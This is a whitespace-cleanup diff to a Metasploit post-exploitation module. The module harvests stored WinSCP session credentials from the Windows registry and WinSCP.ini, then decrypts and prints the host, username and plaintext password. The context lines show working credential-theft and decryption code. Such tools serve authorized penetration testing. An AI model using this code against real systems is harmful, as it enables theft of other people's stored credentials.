@@ -48,11 +48,10 @@ class Metasploit3 < Msf::Post
 			next if hive['HKU'] == nil
 			master_key = "#{hive['HKU']}\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security"
 			masterpw = registry_getvaldata(master_key, 'UseMasterPassword')
-			
+
 			#No WinSCP Keys here
 			next if masterpw.nil?
-				
-			
+
 			regexists = 1
 			if masterpw == 1
 				# Master Password used to add AES256 encryption to stored password
@@ -80,7 +79,7 @@ class Metasploit3 < Msf::Post
 						# If no explicit port number entry exists, it is set to default port of tcp22
 						portnum = 22
 					end
-					
+
 					user = registry_getvaldata(active_session, 'UserName') || ""
 					host = registry_getvaldata(active_session, 'HostName') || ""
 					proto = registry_getvaldata(active_session, 'FSProtocol') || ""
@@ -88,11 +87,11 @@ class Metasploit3 < Msf::Post
 					# If no explicit protocol entry exists it is on sFTP with SCP backup. If it is 0
 					# it is set to SCP.
 					if proto == nil or proto == 0
-						proto = "SCP"					
+						proto = "SCP"
 					else
 						proto = "FTP"
 					end
-					
+
 					#Decrypt our password, and report on results
 					pass= decrypt_password(password, user+host)
 					print_status("Host: #{host}  Port: #{portnum} Protocol: #{proto}  Username: #{user}  Password: #{pass}")
@@ -108,10 +107,8 @@ class Metasploit3 < Msf::Post
 
 				if savedpwds == 0
 					print_status("No Saved Passwords found in the Session Registry Keys")
-				end		
+				end
 			end
-			
-			
 		end
 
 		if regexists == 0
@@ -156,7 +153,7 @@ class Metasploit3 < Msf::Post
 						# If no explicit protocol entry exists it is on sFTP with SCP backup. If it
 						# is 0 it is set to SCP.
 						if proto == nil or proto == 0
-							proto = "SCP"					
+							proto = "SCP"
 						else
 							proto = "FTP"
 						end
@@ -172,7 +169,7 @@ class Metasploit3 < Msf::Post
 						)
 					end
 				end
-			end			
+			end
 		rescue
 			print_status("WinSCP.ini file NOT found...")
 		end
@@ -182,14 +179,14 @@ class Metasploit3 < Msf::Post
 
 		pwalg_simple_magic = 0xA3
 		pwalg_simple_string = "0123456789ABCDEF"
-		
+
 		# Decrypts the next charachter in the password sequence
 		if @password.length > 0
 			# Takes the first char from the encrypted password and finds its position in the
 			# pre-defined string, then left shifts the returned index by 4 bits
 			unpack1 = pwalg_simple_string.index(@password[0,1])
 			unpack1= unpack1 << 4
-			
+
 			# Takes the second char from the encrypted password and finds its position in the
 			# pre-defined string
 			unpack2 = pwalg_simple_string.index(@password[1,1])
@@ -200,7 +197,6 @@ class Metasploit3 < Msf::Post
 			return result
 		end
 
-
 	end
 
 
@@ -210,7 +206,6 @@ class Metasploit3 < Msf::Post
 		@password = pwd
 		flag = decrypt_next_char()
 
-		
 		if flag == pwalg_simple_flag
 			decrypt_next_char();
 			length = decrypt_next_char();
@@ -229,7 +224,6 @@ class Metasploit3 < Msf::Post
 
 		end
 
-		
 		return result
 
 
